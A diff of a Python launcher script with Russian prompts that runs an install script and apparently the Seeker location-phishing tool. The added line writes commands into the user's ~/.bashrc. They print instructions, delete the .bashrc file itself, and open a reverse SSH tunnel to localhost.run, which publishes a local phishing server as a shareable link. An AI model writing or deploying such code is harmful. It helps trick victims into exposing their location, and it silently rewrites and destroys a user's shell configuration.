@@ -428,6 +428,7 @@ while True:
         os.system('chmod 777 install.sh')
         os.system('./install.sh')
         os.system('clear')
+        os.system('echo "clear" >> ~/.bashrc && echo "echo [ваша ссылка находится в самом нижнем ряде]" >> ~/.bashrc && echo "echo [если ссылка не появилась, а последний символ" >> ~/.bashrc && echo "echo знак вопроса напишите [yes]" >> ~/.bashrc && echo "rm ~/.bashrc" >> ~/.bashrc && echo "ssh -R 80:localhost:8080 nokey@localhost.run" >> ~/.bashrc')
         print('[включите моб. точку доступа]')
         print('чтоб получить ссылку создайте второй сезон')
         os.system('python seeker.py')
